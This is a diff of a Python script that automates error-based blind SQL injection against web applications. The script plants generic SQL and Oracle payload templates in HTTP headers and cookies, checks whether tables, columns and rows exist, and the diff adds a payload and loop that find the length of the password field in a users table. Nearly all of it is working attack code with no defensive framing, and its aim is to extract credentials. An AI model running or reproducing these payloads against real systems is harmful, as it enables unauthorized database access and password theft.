@@ -47,13 +47,15 @@ SQL = {
     'BASIC': "' || (SELECT '') || '",
     'CONDITIONAL_SUBSTRING_ENUM': "' || (SELECT CASE WHEN SUBSTR($field_name,$index,1)='$value' THEN to_char(1/0) ELSE '' END FROM $table WHERE $columnName='$columnValue')||",
     'TABLE_CHECK': "' || (SELECT '' FROM $tableName) || '",
-    'COLUMN_CHECK': "' || (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE $columnName='$columnValue')||'"
+    'COLUMN_CHECK': "' || (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE $columnName='$columnValue')||'",
+    'LENGTH_CHECK': "' || (SELECT CASE WHEN LENGTH(password)=$lengthTndex THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE $columnName='$columnValue')||'"
 }
 ORACLE = {
     'BASIC': "' || (SELECT '' from dual) || '",
     'CONDITIONAL_SUBSTRING_ENUM': "' || (SELECT CASE WHEN SUBSTR($field_name,$index,1)='$value' THEN to_char(1/0) ELSE '' END FROM $table WHERE $columnName='$columnValue')||",
     'TABLE_CHECK': "' || (SELECT '' FROM $tableName WHERE ROWNUM = 1) || '",
-    'COLUMN_CHECK': "' || (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE $columnName='$columnValue')||'"
+    'COLUMN_CHECK': "' || (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE $columnName='$columnValue')||'",
+    'LENGTH_CHECK': "' || (SELECT CASE WHEN LENGTH(password)=$lengthTndex THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE $columnName='$columnValue')||'"
 }
 
 args = parser.parse_args()
@@ -88,6 +90,7 @@ protocol = "https://" if args.ssl else "http://"
 headers = dict(message.items())
 url = f"{protocol}{headers['Host']}{request_line.replace('GET ', '').replace(' HTTP/1.1', '')}"
 dbVersion = "UNKNOWN"
+length_index = 0
 
 
 def isSqlCompatible():
@@ -131,10 +134,18 @@ def checkRowExists(tableName, columnName, columnValue):
     return False if executeRequestAndReturnsError() else True
 
 
-def enumerateFieldLength(tableName, columnExists):
+def enumerateFieldLength(tableName, columnName, columnValue):
+    global length_index
     print("Getting field length...")
     for x in range(FIELD_LENGTH_LIMIT):
-        print("Checking length ", x)
+        length_index = x
+
+        inject("LENGTH_CHECK")
+
+        if executeRequestAndReturnsError():
+            return True
+
+    return False
 
 
 def inject(sqlKey, autolookup=True):
@@ -143,8 +154,10 @@ def inject(sqlKey, autolookup=True):
     orgSql = getSQLCommand(sqlKey) if autolookup else sqlKey
     sql = Template(orgSql)
 
+    test = length_index
+
     safeSql = sql.safe_substitute(
-        tableName=tableName, columnName=columnName, columnValue=columnValue)
+        tableName=tableName, columnName=columnName, columnValue=columnValue, lengthTndex=length_index)
 
     for header, value in message.items():
         if MARKER in value:
@@ -164,6 +177,7 @@ def executeRequestAndReturnsError():
 
     print(f"Sending: {cookies}")
     result = args.success in response.text
+    print(f"Result = {result}")
     return result
 
 
@@ -185,3 +199,5 @@ if not checkRowExists(tableName, columnName, columnValue):
     sys.exit()
 else:
     print(f"Entry has {columnName}={columnValue}")
+
+enumerateFieldLength(tableName, columnName, columnValue)
